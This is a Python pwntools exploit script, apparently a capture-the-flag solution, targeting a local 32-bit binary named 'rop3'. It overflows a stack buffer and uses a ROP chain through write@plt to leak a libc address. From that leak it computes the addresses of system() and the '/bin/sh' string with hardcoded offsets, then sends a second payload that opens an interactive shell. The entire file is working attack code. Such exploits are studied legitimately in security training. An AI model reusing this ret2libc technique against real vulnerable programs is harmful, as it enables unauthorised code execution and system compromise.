from pwn import *

io = process('./rop3')

gdb.attach(io)
    

payload = 'A'*0x88
payload += 'BBBB'


payload += p32(0x80483a0)               #address of write@plt

payload += p32(0x080484c6)              #address of main

payload += p32(0x1)                     # args for write
payload += p32(0x804a014)
payload += p32(0x4)


io.sendline(payload)

output = io.recv()
#print(output)

fin = output.encode('hex')
addr='0x'+fin[0:8]
final = p32(int(addr,16))
final_address=hex(unpack(final,'all', endian='big', sign=False))
in_addr = hex(int(final_address,16))

sys_addr = hex(int(final_address,16)-int(0x88320))
binsh = hex(int(final_address,16)+int(0xc285d))


print("leaked : " +in_addr)

print("system : "+ sys_addr)
print("bin/sh : " + binsh)


payload2 = 'A'*0x88
payload2 += 'BBBB'
payload2 += p32(int(sys_addr,16))
payload2 += 'CCCC'
payload2 += p32(int(binsh,16))

io.sendline(payload2)


io.interactive()
